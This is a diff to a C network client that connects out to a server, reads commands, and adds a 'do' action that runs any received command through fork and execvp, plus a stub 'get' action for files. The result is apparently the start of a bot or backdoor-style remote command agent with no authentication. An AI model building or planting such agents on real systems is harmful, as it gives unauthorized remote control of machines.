@@ -7,9 +7,45 @@
 #include <netdb.h>
 #include <sys/socket.h>
 
+#include <actions.h>
+
+// -- Defines
 #define VERSION "0.01"
 #define NET_BUFFER_SIZE 2048
 #define MAX_TRY 5
+
+// -- Prototypes
+void action_do(int argc, char** argv);
+void action_get(int argc, char** argv);
+
+static struct command_action options[] = {
+	{ "do",  action_do },
+	{ "get", action_get },
+	{ "goodbye",   NULL },
+	{ NULL,    NULL }
+};
+
+// -- Actions
+// Exec the given command
+void action_do(int argc, char** argv) {
+	int n = fork();
+	
+	if(n < 0) {
+		// Error
+        perror("[x] Could not fork");
+	} else if(n == 0) {
+		execvp(argv[0], argv);
+		
+		// Error
+        perror("[x] Could not exec the command");
+		exit(EXIT_FAILURE);
+	}
+}
+
+// Get a file
+void action_get(int argc, char** argv) {
+	// TODO
+}
 
 // Connect at the specified port to the specified address, using the given hostname as name
 int server_connect(int port, char* addr, char* hostname) {
@@ -68,10 +104,10 @@ int server_handler(int sock) {
 			
 		while(n && ( buf[n] == '\n' || buf[n] == '\r' || buf[n] == ' ')) // Trim
 			buf[n--] = '\0';
-			
-		// TODO : handle do command
 		
 		printf("[i] read : %s\n", buf);
+		handle_action(buf, options);
+		puts("[i] done !");
 		
 		// Send done
 		if(send(sock, "done", 4, MSG_EOR|MSG_NOSIGNAL) <= 0) {
@@ -124,6 +160,7 @@ int main(int argc, char** argv) {
 		goto connection;
 	}
 	
+	puts("[i] Connected to server !");
 	i = 0; // Reset try counter
 	
 	// Read commands
